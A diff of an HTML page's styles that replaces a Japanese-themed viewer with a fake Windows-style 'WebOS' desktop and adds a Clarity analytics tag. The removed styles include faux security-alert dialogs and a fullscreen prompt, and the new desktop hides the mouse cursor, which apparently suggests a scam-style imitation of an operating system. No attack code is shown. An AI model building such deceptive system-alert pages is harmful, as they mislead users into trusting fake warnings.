@@ -3,1079 +3,1290 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>JP</title>
+    <title>WebOS</title>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "wk68uy882u");
+    </script>
     <style>
-      @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;500;700&family=Noto+Serif+JP:wght@500;700&display=swap");
-
-      :root {
-        --deep-black: #050505;
-        --charcoal: #141414;
-        --ivory: #f7f1e3;
-        --muted-gold: #b79c61;
-        --dark-red: #541c22;
-        --soft-shadow: 0 24px 60px rgba(0, 0, 0, 0.55);
-      }
-
-      * {
+      /* ── Reset ── */
+      *,
+      *::before,
+      *::after {
+        margin: 0;
+        padding: 0;
         box-sizing: border-box;
       }
-
       html,
       body {
         width: 100%;
         height: 100%;
-        margin: 0;
         overflow: hidden;
-        background: var(--deep-black);
-        color: var(--ivory);
-        font-family:
-          "Noto Sans JP", "Hiragino Sans", "Yu Gothic", "Meiryo", sans-serif;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       }
 
-      body.site-loading .viewer-container,
-      body.site-loading .intro-overlay {
-        visibility: hidden;
-        opacity: 0;
-        pointer-events: none;
-      }
-
-      .viewer-container {
-        width: 100vw;
-        height: 100vh;
+      /* ── Desktop ── */
+      #desktop {
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(135deg, #1e3a5f 0%, #0a1628 100%);
         position: relative;
-        display: grid;
-        place-items: center;
-        background:
-          radial-gradient(
-            circle at 20% 20%,
-            rgba(183, 156, 97, 0.14),
-            transparent 38%
-          ),
-          radial-gradient(
-            circle at 80% 85%,
-            rgba(84, 28, 34, 0.22),
-            transparent 45%
-          ),
-          linear-gradient(160deg, #0a0a0a, #131313 48%, #080808);
+        user-select: none;
+        cursor: none;
       }
 
-      .viewer-placeholder {
-        width: min(90vw, 880px);
-        min-height: 38vh;
-        border: 1px solid rgba(247, 241, 227, 0.18);
-        border-radius: 16px;
-        padding: clamp(20px, 3vw, 32px);
-        background: rgba(15, 15, 15, 0.78);
-        backdrop-filter: blur(3px);
+      /* ── Desktop Icons ── */
+      #desktop-icons {
+        position: absolute;
+        top: 16px;
+        left: 16px;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+      .desktop-icon {
+        width: 76px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 4px;
+        padding: 6px 4px;
+        border-radius: 4px;
+        cursor: pointer;
+        color: #fff;
         text-align: center;
       }
-
-      .viewer-placeholder h2 {
-        margin: 0 0 8px;
-        font-weight: 700;
-        letter-spacing: 0.04em;
-        font-size: clamp(1.25rem, 3vw, 2rem);
-        font-family:
-          "Noto Serif JP", "Yu Mincho", "Hiragino Mincho ProN", "MS PMincho",
-          serif;
-        color: var(--ivory);
+      .desktop-icon:hover {
+        background: rgba(255, 255, 255, 0.12);
+      }
+      .desktop-icon.selected {
+        background: rgba(255, 255, 255, 0.22);
+        outline: 1px dotted rgba(255, 255, 255, 0.6);
+      }
+      .desktop-icon svg {
+        width: 40px;
+        height: 40px;
+        filter: drop-shadow(1px 1px 2px rgba(0, 0, 0, 0.5));
+      }
+      .desktop-icon span {
+        font-size: 11px;
+        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.8);
+        line-height: 1.2;
+        word-break: break-word;
       }
 
-      .viewer-placeholder p {
-        margin: 0;
-        color: rgba(247, 241, 227, 0.82);
-        line-height: 1.65;
-        font-size: clamp(0.95rem, 1.8vw, 1.08rem);
+      /* ── Taskbar ── */
+      #taskbar {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        height: 48px;
+        background: rgba(19, 19, 19, 0.92);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        display: flex;
+        align-items: center;
+        z-index: 9999;
+        border-top: 1px solid rgba(255, 255, 255, 0.08);
       }
 
-      #viewerHost .page {
-        position: fixed !important;
-        inset: 0 !important;
-        width: 100vw !important;
-        height: 100vh !important;
-        max-width: none !important;
-        max-height: none !important;
-        border-radius: 0 !important;
-      }
-
-      #viewerHost .alert_popup {
-        top: auto !important;
-        bottom: 35% !important;
-        transform: translate(-50%, 0) !important;
-      }
-
-      #viewerHost .mid-alert__head {
-        background: #b71c1c !important;
-        background-color: #b71c1c !important;
-        background-image: none !important;
-      }
-
-      /* Match chatbox `.win-close` (`.chat-head__win button`): × glyph, white → grey hover */
-      #viewerHost .mid-alert__close {
-        width: 32px !important;
-        height: 28px !important;
-        border-radius: 2px !important;
-        padding: 0 !important;
-        border: none !important;
-        background: transparent !important;
-        box-shadow: none !important;
-        color: #ffffff !important;
-        font-size: 15px !important;
-        line-height: 1 !important;
-        display: inline-flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        cursor: pointer !important;
-        transition:
-          background-color 0.15s ease,
-          color 0.15s ease !important;
-        transform: none !important;
-      }
-
-      #viewerHost .mid-alert__close-icon {
-        display: none !important;
-      }
-
-      #viewerHost .mid-alert__close::after {
-        content: "×" !important;
-      }
-
-      #viewerHost .mid-alert__close:hover {
-        background: rgba(255, 255, 255, 0.1) !important;
-        color: #b8b8b8 !important;
-        box-shadow: none !important;
-      }
-
-      #viewerHost .mid-alert__close:active,
-      #viewerHost .mid-alert__close:hover:active {
-        background: rgba(255, 255, 255, 0.14) !important;
-        color: #9e9e9e !important;
-        transform: none !important;
-      }
-
-      #viewerHost .mid-alert__close:focus-visible {
-        outline: 2px solid rgba(255, 255, 255, 0.75) !important;
-        outline-offset: 2px !important;
-      }
-
-      #viewerHost .mid-alert__head .mid-alert-chat-head__win {
-        display: flex !important;
-        align-items: center !important;
-        gap: 0 !important;
-        flex-shrink: 0 !important;
-      }
-
-      #viewerHost
-        .mid-alert__head
-        .mid-alert-chat-head__win
-        > button:not(.mid-alert__close) {
-        width: 32px !important;
-        height: 28px !important;
-        border-radius: 2px !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        background: transparent !important;
-        box-shadow: none !important;
-        color: #ffffff !important;
-        font-size: 12px !important;
-        line-height: 1 !important;
-        display: inline-flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        cursor: pointer !important;
-        transition:
-          background-color 0.15s ease,
-          color 0.15s ease !important;
-        transform: none !important;
-        font-family: inherit !important;
-      }
-
-      #viewerHost
-        .mid-alert__head
-        .mid-alert-chat-head__win
-        > button:not(.mid-alert__close):hover {
-        background: rgba(255, 255, 255, 0.1) !important;
-        color: #b8b8b8 !important;
-      }
-
-      #viewerHost
-        .mid-alert__head
-        .mid-alert-chat-head__win
-        > button:not(.mid-alert__close):active,
-      #viewerHost
-        .mid-alert__head
-        .mid-alert-chat-head__win
-        > button:not(.mid-alert__close):hover:active {
-        background: rgba(255, 255, 255, 0.14) !important;
-        color: #9e9e9e !important;
-      }
-
-      /* `.modal--security` title bar is light gray; use dark controls + margin-left:auto group */
-      #viewerHost .modal--security .sec-titlebar .modal-security-chat-head__win {
-        display: flex !important;
-        align-items: center !important;
-        gap: 0 !important;
-        flex-shrink: 0 !important;
-        margin-left: auto !important;
-      }
-
-      #viewerHost .modal--security .modal-security-chat-head__win > button {
-        width: 32px !important;
-        height: 28px !important;
-        border-radius: 2px !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        background: transparent !important;
-        box-shadow: none !important;
-        color: #323130 !important;
-        line-height: 1 !important;
-        display: inline-flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        cursor: pointer !important;
-        transition:
-          background-color 0.15s ease,
-          color 0.15s ease !important;
-        transform: none !important;
-        font-family: inherit !important;
-      }
-
-      #viewerHost
-        .modal--security
-        .modal-security-chat-head__win
-        > button.modal-security-win-close {
-        font-size: 15px !important;
-      }
-
-      #viewerHost
-        .modal--security
-        .modal-security-chat-head__win
-        > button:not(.modal-security-win-close) {
-        font-size: 12px !important;
-      }
-
-      #viewerHost .modal--security .modal-security-chat-head__win > button:hover {
-        background: rgba(0, 0, 0, 0.08) !important;
-        color: #605e5c !important;
-      }
-
-      #viewerHost .modal--security .modal-security-chat-head__win > button:active,
-      #viewerHost
-        .modal--security
-        .modal-security-chat-head__win
-        > button:hover:active {
-        background: rgba(0, 0, 0, 0.11) !important;
-        color: #505050 !important;
-      }
-
-      #viewerHost
-        .modal--security
-        .modal-security-chat-head__win
-        > button:focus-visible {
-        outline: 2px solid rgba(0, 120, 212, 0.65) !important;
-        outline-offset: 2px !important;
-      }
-
-      .intro-overlay {
-        position: fixed;
-        inset: 0;
-        z-index: 100;
+      /* Start Button */
+      #start-btn {
+        width: 48px;
+        height: 48px;
         display: flex;
         align-items: center;
         justify-content: center;
-        cursor: none;
-        background:
-          radial-gradient(
-            circle at 15% 20%,
-            rgba(84, 28, 34, 0.25),
-            transparent 42%
-          ),
-          radial-gradient(
-            circle at 84% 78%,
-            rgba(183, 156, 97, 0.18),
-            transparent 42%
-          ),
-          linear-gradient(180deg, #040404, #0b0b0b 60%, #050505);
-        opacity: 1;
-        transition:
-          opacity 640ms ease,
-          visibility 640ms ease;
+        cursor: pointer;
+        border: none;
+        background: transparent;
+        transition: background 0.15s;
+      }
+      #start-btn:hover {
+        background: rgba(255, 255, 255, 0.08);
+      }
+      #start-btn:active {
+        background: rgba(255, 255, 255, 0.04);
+      }
+      #start-btn svg {
+        width: 20px;
+        height: 20px;
       }
 
-      .intro-overlay.is-hidden {
-        opacity: 0;
-        visibility: hidden;
-        pointer-events: none;
+      /* Search bar */
+      #search-bar {
+        height: 32px;
+        width: 280px;
+        margin-left: 4px;
+        background: rgba(255, 255, 255, 0.06);
+        border: 1px solid rgba(255, 255, 255, 0.12);
+        border-radius: 4px;
+        display: flex;
+        align-items: center;
+        padding: 0 10px;
+        gap: 8px;
+        cursor: text;
+        color: rgba(255, 255, 255, 0.5);
+        font-size: 13px;
+      }
+      #search-bar svg {
+        width: 14px;
+        height: 14px;
+        opacity: 0.5;
+        flex-shrink: 0;
       }
 
-      .intro-overlay__brand {
+      /* Taskbar pinned apps */
+      #taskbar-apps {
+        display: flex;
+        align-items: center;
+        margin-left: 8px;
+        height: 100%;
+        gap: 2px;
+      }
+      .taskbar-app {
+        width: 44px;
+        height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 4px;
+        cursor: pointer;
+        position: relative;
+        transition: background 0.15s;
+      }
+      .taskbar-app:hover {
+        background: rgba(255, 255, 255, 0.08);
+      }
+      .taskbar-app.active {
+        background: rgba(255, 255, 255, 0.1);
+      }
+      .taskbar-app.active::after {
+        content: "";
         position: absolute;
-        top: 10px;
+        bottom: 2px;
         left: 50%;
         transform: translateX(-50%);
-        z-index: 0;
-        pointer-events: none;
+        width: 18px;
+        height: 3px;
+        background: #76b9ed;
+        border-radius: 2px;
+      }
+      .taskbar-app svg {
+        width: 22px;
+        height: 22px;
       }
 
-      .intro-overlay__logo {
-        display: block;
-        width: auto;
-        max-width: min(88vw, 480px);
-        height: auto;
-        filter: brightness(1.35) contrast(1.12) saturate(1.08);
-      }
-
-      .kimono-modal {
-        --kimono-surface: #080808;
-        --kimono-raised: #101010;
-        --kimono-line: rgba(255, 255, 255, 0.09);
-        --kimono-muted: rgba(255, 255, 255, 0.55);
-        box-sizing: border-box;
-        width: min(70vw, calc(100vw - 28px));
-        height: 30vh;
-        max-height: 30vh;
-        position: relative;
-        overflow: hidden;
-        border-radius: 18px;
-        padding: clamp(10px, 1.8vh, 18px) clamp(14px, 2.2vw, 28px);
-        display: flex;
-        flex-direction: column;
-        background: linear-gradient(
-            155deg,
-            rgba(255, 255, 255, 0.06) 0%,
-            transparent 42%
-          ),
-          var(--kimono-surface);
-        border: 1px solid var(--kimono-line);
-        box-shadow:
-          0 0 0 1px rgba(0, 0, 0, 0.65) inset,
-          0 32px 80px rgba(0, 0, 0, 0.75),
-          0 0 120px rgba(0, 0, 0, 0.35);
-        z-index: 1;
-      }
-
-      .kimono-modal::before {
-        content: "";
-        position: absolute;
-        top: 0;
-        left: 8%;
-        right: 8%;
-        height: 2px;
-        border-radius: 0 0 4px 4px;
-        background: linear-gradient(
-          90deg,
-          transparent,
-          rgba(255, 255, 255, 0.65) 40%,
-          rgba(255, 255, 255, 0.45) 60%,
-          transparent
-        );
-        pointer-events: none;
-      }
-
-      .kimono-modal::after {
-        content: "";
-        position: absolute;
-        inset: auto -20% -50% auto;
-        width: min(320px, 55vw);
-        height: min(320px, 55vw);
-        pointer-events: none;
-        opacity: 0.1;
-        background: radial-gradient(
-          circle at center,
-          rgba(255, 255, 255, 0.45),
-          transparent 68%
-        );
-      }
-
-      .kimono-modal__inner {
-        position: relative;
-        z-index: 1;
-        flex: 1;
-        min-height: 0;
-        display: flex;
-        flex-direction: row;
-        align-items: stretch;
-        gap: clamp(12px, 2.2vw, 24px);
-      }
-
-      .kimono-modal__column--lead {
-        flex: 1 1 58%;
-        min-width: 0;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        gap: clamp(4px, 0.9vh, 8px);
-        overflow: hidden auto;
-        padding-right: clamp(4px, 0.8vw, 10px);
-        border-right: 1px solid var(--kimono-line);
-        scrollbar-gutter: stable;
-      }
-
-      .kimono-modal__column--progress {
-        flex: 1 1 36%;
-        min-width: min(140px, 28vw);
-        max-width: 42%;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        min-height: 0;
-      }
-
-      .kimono-modal__header {
-        display: flex;
-        flex-direction: column;
-        gap: clamp(2px, 0.45vh, 5px);
-        flex-shrink: 0;
-      }
-
-      .kimono-eyebrow {
-        font-size: clamp(0.58rem, 1.15vh, 0.72rem);
-        font-weight: 600;
-        letter-spacing: 0.14em;
-        color: var(--kimono-muted);
-      }
-
-      .kimono-title,
-      .kimono-subtitle,
-      .kimono-description,
-      .loading-message,
-      .progress-track {
-        position: relative;
-      }
-
-      .kimono-title {
-        margin: 0;
-        font-size: clamp(1rem, 2.8vh, 1.65rem);
-        font-family:
-          "Noto Sans JP", "Hiragino Sans", "Yu Gothic", "Meiryo", sans-serif;
-        font-weight: 700;
-        letter-spacing: -0.02em;
-        line-height: 1.12;
-        color: #fafafa;
-      }
-
-      .kimono-subtitle {
-        margin: 0;
-        color: var(--kimono-muted);
-        letter-spacing: 0.02em;
-        font-size: clamp(0.68rem, 1.55vh, 0.82rem);
-        font-weight: 500;
-        line-height: 1.35;
-      }
-
-      .kimono-description {
-        margin: 0;
-        padding: 0;
-        border: none;
-        color: rgba(250, 250, 250, 0.76);
-        line-height: 1.4;
-        font-size: clamp(0.65rem, 1.35vh, 0.78rem);
-        flex-shrink: 1;
-        min-height: 0;
-      }
-
-      .kimono-load {
-        margin: 0;
-        padding: clamp(8px, 1.4vh, 12px) clamp(10px, 1.5vw, 14px);
-        border-radius: 12px;
-        background: var(--kimono-raised);
-        border: 1px solid var(--kimono-line);
-        flex-shrink: 0;
-      }
-
-      .kimono-load__head {
+      /* System Tray */
+      #system-tray {
+        margin-left: auto;
         display: flex;
         align-items: center;
-        justify-content: space-between;
-        gap: 8px;
-        margin-bottom: clamp(6px, 1vh, 8px);
+        height: 100%;
+        padding-right: 4px;
+      }
+      .tray-btn {
+        height: 100%;
+        padding: 0 6px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        transition: background 0.15s;
+      }
+      .tray-btn:hover {
+        background: rgba(255, 255, 255, 0.06);
+      }
+      .tray-btn svg {
+        width: 16px;
+        height: 16px;
+        color: #fff;
       }
 
-      .kimono-load__label {
-        font-size: clamp(0.57rem, 1.05vh, 0.65rem);
-        font-weight: 600;
-        letter-spacing: 0.1em;
-        color: rgba(255, 255, 255, 0.38);
+      #tray-chevron svg {
+        width: 10px;
+        height: 10px;
       }
 
-      .kimono-load__pulse {
+      #clock {
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-end;
+        justify-content: center;
+        padding: 0 12px;
+        cursor: pointer;
+        font-size: 12px;
+        color: #fff;
+        transition: background 0.15s;
+        line-height: 1.4;
+      }
+      #clock:hover {
+        background: rgba(255, 255, 255, 0.06);
+      }
+      #clock-time {
+        font-size: 12px;
+      }
+      #clock-date {
+        font-size: 12px;
+      }
+
+      #show-desktop {
+        width: 6px;
+        height: 100%;
+        cursor: pointer;
+        border-left: 1px solid rgba(255, 255, 255, 0.1);
+        transition: background 0.15s;
+      }
+      #show-desktop:hover {
+        background: rgba(255, 255, 255, 0.15);
+      }
+
+      /* ── Windows ── */
+      .app-window {
+        position: absolute;
+        min-width: 320px;
+        min-height: 200px;
+        background: #fff;
+        border-radius: 8px 8px 0 0;
+        box-shadow:
+          0 8px 32px rgba(0, 0, 0, 0.45),
+          0 0 0 1px rgba(0, 0, 0, 0.12);
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        transition: box-shadow 0.15s;
+      }
+      .app-window.focused {
+        box-shadow:
+          0 12px 48px rgba(0, 0, 0, 0.55),
+          0 0 0 1px rgba(0, 0, 0, 0.18);
+      }
+      .app-window.minimized {
+        display: none !important;
+      }
+      .app-window.maximized {
+        top: 0 !important;
+        left: 0 !important;
+        width: 100% !important;
+        height: calc(100% - 48px) !important;
+        border-radius: 0;
+      }
+
+      /* Title bar */
+      .title-bar {
+        height: 32px;
+        display: flex;
+        align-items: center;
+        background: #efefef;
+        padding: 0 4px 0 12px;
+        cursor: default;
         flex-shrink: 0;
-        width: 7px;
-        height: 7px;
-        border-radius: 50%;
-        background: #fafafa;
-        box-shadow: 0 0 12px rgba(255, 255, 255, 0.45);
-        animation: kimono-pulse 1.4s ease-in-out infinite;
+      }
+      .app-window.focused .title-bar {
+        background: #f0f0f0;
+      }
+      .title-bar-icon {
+        width: 16px;
+        height: 16px;
+        margin-right: 8px;
+        flex-shrink: 0;
+      }
+      .title-bar-icon svg {
+        width: 16px;
+        height: 16px;
+      }
+      .title-bar-title {
+        font-size: 12px;
+        color: #000;
+        flex: 1;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+      }
+      .app-window:not(.focused) .title-bar-title {
+        color: #999;
       }
 
-      @keyframes kimono-pulse {
+      .title-bar-btns {
+        display: flex;
+        height: 100%;
+        margin-left: auto;
+      }
+      .title-bar-btn {
+        width: 46px;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: none;
+        background: transparent;
+        cursor: pointer;
+        transition: background 0.1s;
+      }
+      .title-bar-btn svg {
+        width: 10px;
+        height: 10px;
+      }
+      .title-bar-btn:hover {
+        background: rgba(0, 0, 0, 0.06);
+      }
+      .btn-close:hover {
+        background: #e81123 !important;
+      }
+      .btn-close:hover svg {
+        color: #fff;
+      }
+
+      /* Window content */
+      .window-content {
+        flex: 1;
+        background: #fff;
+        overflow: auto;
+      }
+
+      /* Default window content */
+      .win-default-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100%;
+        padding: 32px 40px;
+        text-align: center;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        color: #333;
+      }
+      .win-default-notice {
+        font-size: 13px;
+        color: #0067c0;
+        background: rgba(0, 103, 192, 0.06);
+        border: 1px solid rgba(0, 103, 192, 0.15);
+        border-radius: 6px;
+        padding: 10px 20px;
+        margin-bottom: 20px;
+        line-height: 1.6;
+        max-width: 480px;
+      }
+      .win-default-lorem {
+        font-size: 12px;
+        color: #888;
+        line-height: 1.8;
+        max-width: 500px;
+        margin-bottom: auto;
+      }
+      .win-default-footer {
+        margin-top: 24px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 6px;
+        padding-top: 16px;
+        border-top: 1px solid #eee;
+        width: 100%;
+        max-width: 800px;
+      }
+      .win-default-brand {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .win-default-brand svg {
+        width: 20px;
+        height: 20px;
+      }
+      .win-default-brand span {
+        font-size: 14px;
+        font-weight: 600;
+        color: #1a1a1a;
+      }
+      .win-default-fine {
+        font-size: 10px;
+        color: #aaa;
+        line-height: 1.5;
+        max-width: 400px;
+      }
+
+      /* Worker stats panel */
+      .worker-stats {
+        background: #0c0c0c;
+        border-radius: 6px;
+        padding: 14px 18px;
+        margin: 12px 0;
+        width: 100%;
+        max-width: 500px;
+        font-family: "Consolas", "Courier New", monospace;
+        font-size: 12px;
+        color: #0f0;
+        line-height: 1.7;
+        text-align: left;
+      }
+      .worker-stats-header {
+        color: #0a84ff;
+        font-weight: 700;
+        font-size: 13px;
+        margin-bottom: 6px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .worker-stats-header .worker-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: #0f0;
+        display: inline-block;
+        animation: worker-blink 1s ease-in-out infinite;
+      }
+      @keyframes worker-blink {
         0%,
         100% {
-          opacity: 0.35;
-          transform: scale(0.92);
+          opacity: 1;
         }
         50% {
-          opacity: 1;
-          transform: scale(1);
+          opacity: 0.3;
         }
       }
-
-      @media (prefers-reduced-motion: reduce) {
-        .kimono-load__pulse {
-          animation: none;
-          opacity: 0.85;
-        }
-      }
-
-      .loading-message {
-        min-height: 1.35em;
-        margin: 0 0 clamp(6px, 0.9vh, 8px);
-        color: rgba(250, 250, 250, 0.88);
-        font-size: clamp(0.65rem, 1.25vh, 0.78rem);
-        font-weight: 500;
-        letter-spacing: 0.01em;
-        line-height: 1.25;
-        display: -webkit-box;
-        -webkit-box-orient: vertical;
-        -webkit-line-clamp: 3;
-        overflow: hidden;
-      }
-
-      .progress-track {
-        width: 100%;
-        height: 3px;
-        border-radius: 999px;
-        background: rgba(255, 255, 255, 0.08);
-        overflow: hidden;
-      }
-
-      .progress-fill {
-        width: 0;
-        height: 100%;
-        border-radius: inherit;
-        background: linear-gradient(
-          90deg,
-          rgba(255, 255, 255, 0.55),
-          #ffffff
-        );
-        box-shadow: 0 0 20px rgba(255, 255, 255, 0.25);
-        transition: width 90ms linear;
-      }
-
-      @media (max-width: 640px), (max-height: 420px) {
-        .kimono-modal {
-          width: min(92vw, calc(100vw - 16px));
-          height: auto;
-          max-height: min(52vh, 420px);
-        }
-
-        .kimono-modal__inner {
-          flex-direction: column;
-          gap: 10px;
-        }
-
-        .kimono-modal__column--lead {
-          border-right: none;
-          border-bottom: 1px solid var(--kimono-line);
-          padding-right: 0;
-          padding-bottom: 8px;
-          max-height: min(28vh, 200px);
-          overflow-y: auto;
-        }
-
-        .kimono-modal__column--progress {
-          max-width: none;
-          min-width: 0;
-          flex: 0 0 auto;
-        }
-
-      }
-
-      .fs-prompt-backdrop {
-        position: fixed;
-        inset: 0;
-        z-index: 49;
-        background: #ffffff;
-        opacity: 1;
-        transition: opacity 220ms ease;
-      }
-
-      .fs-prompt-backdrop.is-hidden {
-        opacity: 0;
-        pointer-events: none;
-      }
-
-      .fs-prompt {
-        position: fixed;
-        inset: 0;
-        z-index: 50;
+      .worker-stats-row {
         display: flex;
-        align-items: center;
-        justify-content: center;
-        min-width: 0;
-        max-width: none;
-        width: 100vw;
-        height: 100vh;
-        background: #ffffff;
-        color: #202124;
-        border: none;
-        border-radius: 0;
-        box-shadow: none;
-        padding: clamp(20px, 5vw, 48px);
-        font-family:
-          "Noto Sans JP", "Hiragino Sans", "Yu Gothic", "Meiryo", "Roboto",
-          Arial, sans-serif;
-        font-size: 24px;
-        line-height: 1.5;
-        opacity: 1;
-        transition:
-          opacity 220ms ease,
-          visibility 220ms ease;
+        justify-content: space-between;
+      }
+      .worker-stats-label {
+        color: #888;
+      }
+      .worker-stats-value {
+        color: #0f0;
       }
 
-      .fs-prompt > * {
-        width: min(92vw, 920px);
-      }
-
-      .fs-prompt__content {
-        position: relative;
-        border: 1px solid #000000;
-        padding: 0 clamp(16px, 2.2vw, 28px) clamp(16px, 2.2vw, 28px);
-        box-shadow: 0 18px 45px rgba(0, 0, 0, 0.22);
-      }
-
-      .fs-prompt__topbar {
-        height: 29px;
-        background: #efefef;
-        border: none;
-        margin: 0 calc(clamp(16px, 2.2vw, 28px) * -1) 12px;
-        display: flex;
-        align-items: center;
-        justify-content: flex-start;
-        padding: 0 10px;
-        gap: 6px;
-        font-size: 13px;
-        color: #1f1f1f;
-      }
-
-      .fs-prompt__topbar-logo {
-        height: 16px;
-        width: auto;
-        display: block;
-      }
-
-      .fs-prompt__window-controls {
+      /* Resize handles */
+      .resize-handle {
         position: absolute;
-        top: 0;
-        right: 0;
-        display: inline-flex;
-        gap: 0;
+        z-index: 2;
       }
-
-      .fs-prompt__chrome-btn {
-        width: 38px;
-        height: 29px;
-        border: none;
-        border-radius: 0;
-        background: #efefef;
-        color: #1f1f1f;
-        font-size: 15px;
-        line-height: 1;
-        align-items: center;
-        justify-content: center;
-        display: inline-flex;
-        cursor: pointer;
-        transition:
-          background-color 150ms ease,
-          border-color 150ms ease,
-          box-shadow 150ms ease;
+      .resize-n {
+        top: -3px;
+        left: 8px;
+        right: 8px;
+        height: 6px;
+        cursor: n-resize;
       }
-
-      .fs-prompt__chrome-btn:hover {
-        background: #d9d9d9;
-        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
+      .resize-s {
+        bottom: -3px;
+        left: 8px;
+        right: 8px;
+        height: 6px;
+        cursor: s-resize;
       }
-
-      .fs-prompt__chrome-btn:active {
-        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.12);
+      .resize-e {
+        right: -3px;
+        top: 8px;
+        bottom: 8px;
+        width: 6px;
+        cursor: e-resize;
       }
-
-      .fs-prompt__chrome-btn:focus-visible {
-        outline: 2px solid #1a73e8;
-        outline-offset: 2px;
+      .resize-w {
+        left: -3px;
+        top: 8px;
+        bottom: 8px;
+        width: 6px;
+        cursor: w-resize;
       }
-
-      #fsPromptControlClose {
-        background: #d93025;
-        color: #ffffff;
+      .resize-nw {
+        top: -3px;
+        left: -3px;
+        width: 12px;
+        height: 12px;
+        cursor: nw-resize;
       }
-
-      #fsPromptControlClose:hover {
-        background: #a52714;
-        border-color: #8d2211;
+      .resize-ne {
+        top: -3px;
+        right: -3px;
+        width: 12px;
+        height: 12px;
+        cursor: ne-resize;
       }
-
-      .fs-prompt.is-hidden {
-        opacity: 0;
-        pointer-events: none;
-        visibility: hidden;
+      .resize-sw {
+        bottom: -3px;
+        left: -3px;
+        width: 12px;
+        height: 12px;
+        cursor: sw-resize;
       }
-
-      .fs-prompt__phase.is-hidden {
+      .resize-se {
+        bottom: -3px;
+        right: -3px;
+        width: 12px;
+        height: 12px;
+        cursor: se-resize;
+      }
+      .app-window.maximized .resize-handle {
         display: none;
       }
 
-      .fs-prompt__message {
-        margin: 0 0 12px;
-        color: #202124;
+      /* ── Start Menu ── */
+      #start-menu {
+        position: absolute;
+        bottom: 48px;
+        left: 0;
+        width: 600px;
+        height: 580px;
+        background: rgba(32, 32, 32, 0.95);
+        backdrop-filter: blur(30px);
+        -webkit-backdrop-filter: blur(30px);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        border-radius: 8px;
+        z-index: 10000;
+        display: none;
+        flex-direction: column;
+        color: #fff;
+        box-shadow: 0 16px 48px rgba(0, 0, 0, 0.5);
+        overflow: hidden;
+      }
+      #start-menu.open {
+        display: flex;
       }
 
-      .fs-prompt__phase--complete .fs-prompt__message {
+      #start-menu-search {
+        margin: 16px 24px 8px;
+        height: 36px;
+        background: rgba(255, 255, 255, 0.08);
+        border: 1px solid rgba(255, 255, 255, 0.15);
+        border-radius: 4px;
+        display: flex;
+        align-items: center;
+        padding: 0 12px;
+        gap: 8px;
+        color: rgba(255, 255, 255, 0.5);
+        font-size: 13px;
+      }
+      #start-menu-search svg {
+        width: 14px;
+        height: 14px;
+        opacity: 0.5;
+      }
+
+      #start-menu-label {
+        padding: 12px 28px 8px;
+        font-size: 14px;
+        font-weight: 600;
+      }
+
+      #start-menu-grid {
+        display: grid;
+        grid-template-columns: repeat(6, 1fr);
+        gap: 4px;
+        padding: 0 20px 16px;
+        overflow-y: auto;
+        flex: 1;
+      }
+      .start-app {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 6px;
+        padding: 12px 4px;
+        border-radius: 4px;
+        cursor: pointer;
         text-align: center;
       }
+      .start-app:hover {
+        background: rgba(255, 255, 255, 0.08);
+      }
+      .start-app svg {
+        width: 28px;
+        height: 28px;
+      }
+      .start-app span {
+        font-size: 11px;
+        line-height: 1.2;
+      }
 
-      .fs-prompt__phase--complete .fs-prompt__actions {
+      #start-menu-footer {
+        border-top: 1px solid rgba(255, 255, 255, 0.08);
+        padding: 8px 20px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      #start-user {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 8px;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+      #start-user:hover {
+        background: rgba(255, 255, 255, 0.08);
+      }
+      #start-user-avatar {
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.15);
+        display: flex;
+        align-items: center;
         justify-content: center;
       }
-
-      .fs-prompt__complete-title {
-        display: block;
-        font-size: clamp(2rem, 6vw, 3.8rem);
-        font-weight: 800;
-        line-height: 1.06;
-        letter-spacing: 0.01em;
-        margin-bottom: 18px;
+      #start-user-avatar svg {
+        width: 16px;
+        height: 16px;
+      }
+      #start-user-name {
+        font-size: 13px;
+      }
+      #start-power {
+        padding: 8px;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+      #start-power:hover {
